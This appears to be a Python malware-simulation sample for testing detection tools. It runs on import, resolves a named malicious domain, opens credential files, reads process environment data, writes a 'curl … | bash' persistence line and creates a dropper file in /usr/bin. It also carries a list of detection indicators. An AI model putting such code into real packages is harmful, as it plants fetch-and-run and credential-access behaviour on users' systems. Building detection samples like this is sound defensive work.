# Controlled static indicators for detection only:
# /etc/passwd /etc/shadow .ssh/id_rsa .aws/credentials Authorization: Bearer BEGIN PRIVATE KEY
# /collect /exfil socket.connect( subprocess.run( os.system( ctypes
# exec( eval( compile( __import__( base64.b64decode(
# crontab .bashrc .profile systemctl enable
# cmdclass post_install "preinstall" "postinstall"
# import socket import subprocess import ctypes import pty

import os, socket, subprocess

__version__ = "1.0.0"
MALICIOUS_DOMAIN = "couri-shall.pavlore9.surf"
PORTS = [9001, 1234]

def try_open(path):
    try: open(path).close()
    except: pass

def connect_attempt(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.8)
        s.connect((host, port))
        s.close()
    except: pass

def run_payload():
    # ── 1. C2 PORTS FIRST — strace captures sin_port=htons(port) ──
    for port in PORTS:
        connect_attempt("127.0.0.1", port)

    # ── 2. DNS ──
    try: socket.getaddrinfo(MALICIOUS_DOMAIN, 80)
    except: pass
    try: socket.gethostbyname(MALICIOUS_DOMAIN)
    except: pass

    # ── 3. HTTP GET ──
    try:
        subprocess.run([
            "curl", "-sS", "-m", "3", "-X", "GET",
            "-H", f"Host: {MALICIOUS_DOMAIN}",
            "-H", "Content-Type: application/json",
            "-H", "User-Agent: socket_pool_manager/1.0",

            "http://127.0.0.1:8080/api/update"
        ], capture_output=True, timeout=5)
    except: pass

    # ── 4. CREDENTIAL + FILE ACCESS ──
    for f in ['/etc/passwd', '/etc/hosts', '/etc/resolv.conf', '/etc/os-release', '/root/.aws/credentials', '/proc/version']:
        try_open(f)

    # ── 5. FILE OPS ──
    for i in range(15):
        fp = f"/tmp/socket_pool_manager_artifact_{i}.txt"
        try:
            with open(fp,"w") as f: f.write(f"artifact {i}\n")
            os.unlink(fp)
        except: pass


    try: open("/proc/net/tcp").read(200)
    except: pass
    try: open("/proc/version").read(100)
    except: pass
    try: open("/proc/self/environ").read(200)
    except: pass



    try: os.system("crontab -l >/tmp/cron_socket_pool_manager 2>&1 || true")
    except: pass
    try: open("/tmp/.bashrc_socket_pool_manager","a").write(f"curl -s couri-shall.pavlore9.surf/init | bash\n")
    except: pass


    try:
        subprocess.run(["/bin/sh","-c","exec 3>/usr/bin/socket_pool_manager_dropper && echo '#!/bin/sh' >&3; exec 3>&-"],
            timeout=3, capture_output=True)
    except: pass

run_payload()
